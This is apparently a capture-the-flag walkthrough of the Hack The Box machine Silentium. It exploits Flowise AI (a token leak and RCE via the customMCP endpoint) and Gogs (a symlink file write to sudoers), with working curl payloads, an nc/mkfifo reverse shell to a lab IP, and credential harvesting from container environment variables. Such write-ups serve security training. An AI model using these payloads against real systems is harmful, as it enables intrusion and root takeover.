# 🎯 Silentium – Hack The Box Walkthrough

**Difficulty:** Easy  
**OS:** Linux  
**Player #:** 7,008  
**Date Completed:** May 2026

---

## 📋 Machine Summary

Silentium is an Easy Linux machine that requires exploiting multiple vulnerabilities:
- Flowise AI (CVE-2025-58434) – Password Reset Token Leak
- Flowise RCE via customMCP endpoint
- Gogs (CVE-2025-8110) – Arbitrary File Write via Symlink

The attack chain goes from **web application → Docker container → Host → Root**.

---

## 🔍 Enumeration

```bash
# Add domain to /etc/hosts
echo "<ip> silentium.htb" >> /etc/hosts

# Subdomain fuzzing
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain

💀 Initial Access – Flowise AI (CVE-2025-58434)
Step 1: Leak Password Reset Token
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'

Step 2: Reset Password (flattened payload!)
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"tempToken":"<LEAKED_TOKEN>","password":"Hacked123!","confirmPassword":"Hacked123!"}'

Step 3: Get API Key from Dashboard

Login to staging.silentium.htb → Settings → API Keys → Generate new key
Step 4: RCE via customMCP Endpoint
# Start listener
nc -lvnp 4444

# Reverse shell
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Authorization: Bearer <API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.52 4444 >/tmp/f\");return 1;})()} )"}}'

🔑 Pivot to Host – Extract Credentials from Container
# Inside container shell
env | grep -i "pass"
# Found: SMTP_PASSWORD=qqqqqqqqqqq

# SSH to host
ssh ben@silentium.htb
# Password: qqqqqqq

User Flag: wwwwwwwwwwwwwwwwwwww

🐛 Privilege Escalation – Gogs (CVE-2025-8110)
Step 1: SSH Tunnel for Browser Access
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb

Step 2: Register in Gogs

Open http://127.0.0.1:3001 → Sign Up
Username: Attacker | Password: Pwn123456

Step 3: Create Repository with Symlink
git clone http://Attacker:Pwn123456@127.0.0.1:3001/Attacker/exploit.git
cd exploit
ln -sf /etc/sudoers.d/ben malicious_link
git add malicious_link
git commit -m "add symlink"
git push origin master

Step 4: Generate API Token

Settings → Applications → Generate Token → Copy token
Step 5: Trigger Arbitrary File Write
TOKEN="your-token"
curl -X PUT "http://127.0.0.1:3001/api/v1/repos/Attacker/exploit/contents/malicious_link" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message":"exploit","content":"YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==","branch":"master"}'

Step 6: Root Access
sudo id
# uid=0(root) gid=0(root)

sudo cat /root/root.txt

Root Flag: 88888888888888888888

📚 Tools Used

    gobuster – Subdomain fuzzing

    curl – API exploitation

    nc – Reverse shell listener

    git – Symlink push

    ssh – Tunneling and pivoting

🧠 Key Takeaways

    API endpoints can leak sensitive tokens in responses

    Flattened vs nested JSON payloads matter

    Container environment variables often contain host credentials

    Gogs symlink vulnerability (CVE-2025-8110) allows arbitrary file write

    /etc/sudoers.d/ misconfigurations can lead to root

📎 References

    CVE-2025-58434 – Flowise AI Password Reset Token Leak

    CVE-2025-8110 – Gogs Arbitrary File Write

# Found: staging.silentium.htb (Flowise AI v3.0.5)

